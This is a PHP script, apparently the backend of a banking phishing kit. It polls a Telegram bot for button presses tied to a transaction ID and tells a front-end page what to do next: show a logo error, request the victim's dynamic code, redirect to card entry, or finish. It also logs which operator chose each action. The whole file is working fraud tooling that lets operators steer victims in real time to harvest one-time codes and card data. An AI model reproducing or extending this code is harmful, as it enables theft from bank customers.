<?php
session_start();
header('Content-Type: application/json');
$config = require __DIR__ . '/../config.php';

$transactionId = $_POST['transactionId'] ?? '';
$messageId     = $_POST['messageId'] ?? '';

if (empty($transactionId) || empty($messageId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

$offset = isset($_SESSION['last_update_id']) ? $_SESSION['last_update_id'] : 0;

$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset=" . ($offset + 1));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);
$action = null;

foreach ($data['result'] ?? [] as $update) {
    if (!isset($update['callback_query'])) continue;
    if (!isset($update['update_id'])) continue;

    if ($update['update_id'] <= $offset) continue;

    $_SESSION['last_update_id'] = $update['update_id'];

    $callback = $update['callback_query'];
    if (strpos($callback['data'], $transactionId) === false) continue;

    list($actionType, ) = explode(':', $callback['data']);
    $action = $actionType;

    $msg        = $callback['message'] ?? [];
    $origText   = $msg['text'] ?? '';
    $origChatId = $msg['chat']['id'] ?? $config['chat_id'];
    $origMsgId  = $msg['message_id'] ?? $messageId;

    $from = $callback['from'] ?? [];
    $username = $from['username'] ?? '';
    $first = $from['first_name'] ?? '';
    $last = $from['last_name'] ?? '';
    $operador = $username ? "@$username" : trim("$first $last");
    if ($operador === '') $operador = 'Operador';

    $acciones = [
        'error_logo'        => 'Marcó ERROR DE LOGO',
        'pedir_dinamica'    => 'Pidió DINÁMICA',
        'error_tc'          => 'Redirigió a TARJETA',
        'confirm_finalizar' => 'FINALIZÓ la operación'
    ];
    $accionHumana = $acciones[$actionType] ?? 'Acción desconocida';

    if ($origText !== '') {
        $newText  = $origText;
        $newText .= "\n\n————————————\n";
        $newText .= "✅ Acción: <b>{$accionHumana}</b>\n";
        $newText .= "👤 Operador: <b>{$operador}</b>";

        $editPayload = [
            'chat_id'    => $origChatId,
            'message_id' => $origMsgId,
            'text'       => $newText,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $chEdit = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageText");
        curl_setopt($chEdit, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($chEdit, CURLOPT_POST, true);
        curl_setopt($chEdit, CURLOPT_POSTFIELDS, json_encode($editPayload));
        curl_setopt($chEdit, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($chEdit);
        curl_close($chEdit);
    }

    break;
}

echo json_encode(['action' => $action]);
